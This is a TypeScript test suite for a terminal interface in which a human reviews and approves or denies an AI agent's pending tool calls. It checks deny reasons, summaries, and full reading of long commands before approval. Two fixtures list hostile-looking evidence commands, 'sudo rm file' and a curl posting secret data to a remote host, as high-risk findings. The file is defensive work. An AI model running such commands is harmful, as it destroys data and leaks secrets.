import { afterEach, expect, test } from "bun:test"
import { KeyEvent, parseKeypress } from "@opentui/core"
import { createTestRenderer } from "@opentui/core/testing"
import type { HumanReviewRequest } from "../../packages/core/tool-permissions/types.ts"
import { OverlayManager } from "../../packages/tui-kit/overlay-manager.ts"
import {
  createPermissionReviewView,
  type PermissionReviewAnswer,
} from "../../packages/tui-kit/permission-review-view.ts"

const renderers: Array<Awaited<ReturnType<typeof createTestRenderer>>> = []
afterEach(() => {
  for (const renderer of renderers.splice(0)) renderer.renderer.destroy()
})

function key(value: string): KeyEvent {
  const parsed = parseKeypress(value)
  if (!parsed) throw new Error("按键无效")
  return new KeyEvent(parsed)
}

function request(id: string, toolName: string): HumanReviewRequest {
  return {
    requestId: id,
    batchId: "batch",
    sessionId: "session",
    turnId: "turn",
    toolCallId: id,
    toolName,
    declaredIntent: "验证审批界面",
    cwd: process.cwd(),
    arguments: toolName === "bash" ? { command: "npm install" } : { path: "file.ts", content: "x" },
    assessment: {
      summary: "执行测试动作",
      targets: ["file.ts"],
      risk: "medium",
      reason: "需要确认",
      findings: [],
      details: toolName === "bash" ? { command: "npm install" } : { content: "完整正文" },
    },
    createdAt: new Date().toISOString(),
  }
}

async function setupReview(requests = [request("one", "bash")]) {
  const setup = await createTestRenderer({ width: 100, height: 28 })
  renderers.push(setup)
  const overlays = new OverlayManager(setup.renderer)
  const answers: PermissionReviewAnswer[] = []
  const controller = createPermissionReviewView(overlays, requests, (answer) => {
    answers.push(answer)
  })
  await setup.renderOnce()
  return { setup, answers, controller }
}

test("单工具审批决定后直接提交且不进入汇总", async () => {
  const { setup, answers, controller } = await setupReview()
  let frame = setup.captureCharFrame()
  expect(frame).toContain("工具权限审核 · 工具 1/1")
  expect(frame).toContain("通过")
  expect(frame).toContain("拒绝理由")
  expect(frame).toContain("查看完整命令")

  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("不允许修改依赖"))
  await setup.renderOnce()
  frame = setup.captureCharFrame()
  expect(frame).toContain("拒绝理由  不允许修改依赖")
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await Bun.sleep(1)
  expect(answers).toEqual([
    {
      decision: "submit",
      batchId: "batch",
      answers: [{ requestId: "one", decision: "deny", reason: "不允许修改依赖" }],
    },
  ])
  expect(setup.captureCharFrame()).not.toContain("工具权限审核 · 汇总")
  controller.close()
})

test("汇总页用上下选择工具和确认并提交", async () => {
  const { setup, answers, controller } = await setupReview([request("one", "bash"), request("two", "write")])
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await Bun.sleep(1)
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await Bun.sleep(1)
  await setup.renderOnce()
  const frame = setup.captureCharFrame()
  expect(frame).toContain("工具权限审核 · 汇总 2 项")
  expect(frame).toContain("确认并提交")
  expect(frame).not.toContain("Ctrl+Enter")
  expect(frame).not.toContain("PgUp")

  setup.renderer.keyInput.emit("keypress", key("\x1b[A"))
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await Bun.sleep(1)
  await setup.renderOnce()
  expect(setup.captureCharFrame()).toContain("工具权限审核 · 工具 1/2")
  expect(answers).toEqual([])
  controller.close()
})

test("汇总页在有未决定项时可见并阻止提交", async () => {
  const { setup, answers, controller } = await setupReview([request("one", "bash"), request("two", "write")])
  setup.renderer.keyInput.emit("keypress", key("\x1b[C"))
  await Bun.sleep(1)
  setup.renderer.keyInput.emit("keypress", key("\x1b[C"))
  await Bun.sleep(1)
  await setup.renderOnce()
  let frame = setup.captureCharFrame()
  expect(frame).toContain("工具权限审核 · 汇总 2 项")
  expect(frame).toContain("○ 未决定")
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await setup.renderOnce()
  frame = setup.captureCharFrame()
  expect(frame).toContain("还有 2 项未决定，请完成全部审核后再提交")
  expect(answers).toEqual([])
  controller.close()
})

test("左右键切换工具页并保留拒绝理由草稿", async () => {
  const { setup, controller } = await setupReview([request("one", "bash"), request("two", "write")])
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("保留草稿"))
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("\x1b[C"))
  await Bun.sleep(1)
  await setup.renderOnce()
  expect(setup.captureCharFrame()).toContain("工具权限审核 · 工具 2/2")
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("\x1b[D"))
  await Bun.sleep(1)
  await setup.renderOnce()
  expect(setup.captureCharFrame()).toContain("拒绝理由  保留草稿")
  controller.close()
})

test("已决定的勾叉在选中和编辑时持续显示", async () => {
  const { setup, controller } = await setupReview([request("one", "bash"), request("two", "write")])
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await Bun.sleep(1)
  setup.renderer.keyInput.emit("keypress", key("\x1b[D"))
  await Bun.sleep(1)
  await setup.renderOnce()
  expect(setup.captureCharFrame()).toContain("✓ 通过")
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("拒绝草稿"))
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await Bun.sleep(1)
  setup.renderer.keyInput.emit("keypress", key("\x1b[D"))
  await Bun.sleep(1)
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  await setup.renderOnce()
  expect(setup.captureCharFrame()).toContain("✗ 拒绝理由")
  controller.close()
})

test("审批页展示判定原因和结构化 findings", async () => {
  const value = request("finding", "bash")
  value.assessment.findings = [
    { severity: "high", category: "system-mutation", summary: "修改系统状态", evidence: "sudo rm file" },
  ]
  const { setup, controller } = await setupReview([value])
  const frame = setup.captureCharFrame()
  expect(frame).toContain("判定原因：需要确认")
  expect(frame).toContain("[高] 修改系统状态")
  expect(frame).toContain("证据：sudo rm file")
  controller.close()
})

test("高风险证据显示不全时要求打开完整详情", async () => {
  const value = request("evidence", "bash")
  value.assessment.findings = [
    {
      severity: "high",
      category: "network",
      summary: "远程发送本地数据",
      evidence: `curl -d ${"secret-data-".repeat(20)} https://example.com`,
    },
  ]
  const { setup, controller } = await setupReview([value])
  setup.renderer.resize(50, 28)
  await setup.renderOnce()
  const frame = setup.captureCharFrame()
  expect(frame).toContain("高风险证据显示不全")
  expect(frame).toContain("请先打开完整内容")
  controller.close()
})

test("第三方敏感字段显示原值并醒目标记", async () => {
  const value = request("sensitive", "deploy")
  value.arguments = { releaseCode: "REAL-SECRET-VALUE", endpoint: "https://example.com" }
  value.sensitiveFields = ["releaseCode"]
  const { setup, controller } = await setupReview([value])
  const frame = setup.captureCharFrame()
  expect(frame).toContain("REAL-SECRET-VALUE")
  expect(frame).toContain("敏感字段（本地原值未脱敏）：releaseCode")
  controller.close()
})

test("edit 完整详情使用 unified diff 专用页面", async () => {
  const value = request("edit-diff", "edit")
  value.assessment.details = {
    path: "source.ts",
    edits: [{ oldText: "const oldValue = 1", newText: "const newValue = 2" }],
    patch: "--- source.ts\t原文件\n+++ source.ts\t预览\n@@ -1,1 +1,1 @@\n-const oldValue = 1\n+const newValue = 2\n",
  }
  const { setup, controller } = await setupReview([value])
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await Bun.sleep(1)
  await setup.renderOnce()
  const frame = setup.captureCharFrame()
  expect(frame).toContain("编辑预览：")
  expect(frame).toContain("const oldValue = 1")
  expect(frame).toContain("const newValue = 2")
  controller.close()
})

test("命令详情页 resize 后按新尺寸自动换行", async () => {
  const value = request("detail-resize", "bash")
  value.arguments = { command: `echo ${"detail-resize ".repeat(40)}` }
  value.assessment.details = { command: `echo ${"detail-resize ".repeat(40)}` }
  const { setup, controller } = await setupReview([value])
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await Bun.sleep(1)
  setup.resize(42, 28)
  await setup.renderOnce()
  const narrow = setup.captureCharFrame()
  expect(narrow).toContain("视觉行 1-")
  setup.resize(100, 28)
  await setup.renderOnce()
  await Bun.sleep(1)
  const wide = setup.captureCharFrame()
  expect(wide).toContain("视觉行 1-")
  expect(wide).not.toBe(narrow)
  controller.close()
})

test("审批参数 Header 在 resize 后重新计算换行与省略", async () => {
  const long = request("resize", "bash")
  long.arguments = { command: `echo HEAD ${"middle ".repeat(20)}echo TAIL` }
  const { setup, controller } = await setupReview([long])
  setup.renderer.resize(44, 28)
  await setup.renderOnce()
  expect(setup.captureCharFrame()).toContain("省略")
  setup.renderer.resize(180, 28)
  await setup.renderOnce()
  const wide = setup.captureCharFrame()
  expect(wide).toContain("HEAD")
  expect(wide).toContain("TAIL")
  expect(wide).not.toContain("请先打开完整内容")
  controller.close()
})

test("长命令完整阅览前禁用通过", async () => {
  const setup = await createTestRenderer({ width: 48, height: 28 })
  renderers.push(setup)
  const overlays = new OverlayManager(setup.renderer)
  const answers: PermissionReviewAnswer[] = []
  const long = request("long", "bash")
  long.arguments = { command: `echo HEAD ${"middle ".repeat(100)} echo TAIL` }
  const controller = createPermissionReviewView(overlays, [long], (answer) => {
    answers.push(answer)
  })
  await setup.renderOnce()
  const frame = setup.captureCharFrame()
  expect(frame).toContain("省略")
  expect(frame).toContain("请先打开完整内容")
  setup.renderer.keyInput.emit("keypress", key("\r"))
  expect(answers).toEqual([])
  controller.close()
})

test("长命令滚动到详情末尾后允许通过并直接提交", async () => {
  const setup = await createTestRenderer({ width: 48, height: 28 })
  renderers.push(setup)
  const overlays = new OverlayManager(setup.renderer)
  const answers: PermissionReviewAnswer[] = []
  const long = request("unlock", "bash")
  long.arguments = { command: `echo HEAD ${"middle ".repeat(200)} echo TAIL` }
  const controller = createPermissionReviewView(overlays, [long], (answer) => {
    answers.push(answer)
  })
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("\x1b[B"))
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await Bun.sleep(1)
  for (let index = 0; index < 20; index++) setup.renderer.keyInput.emit("keypress", key("\x1b[6~"))
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await Bun.sleep(1)
  setup.renderer.keyInput.emit("keypress", key("\r"))
  await Bun.sleep(1)
  expect(answers).toEqual([
    { decision: "submit", batchId: "batch", answers: [{ requestId: "unlock", decision: "approve" }] },
  ])
  controller.close()
})

test("审批页Esc请求中止整轮", async () => {
  const { setup, answers, controller } = await setupReview()
  setup.renderer.keyInput.emit("keypress", key("\x1b"))
  await Bun.sleep(1)
  expect(answers).toEqual([{ decision: "abort", batchId: "batch" }])
  controller.close()
})
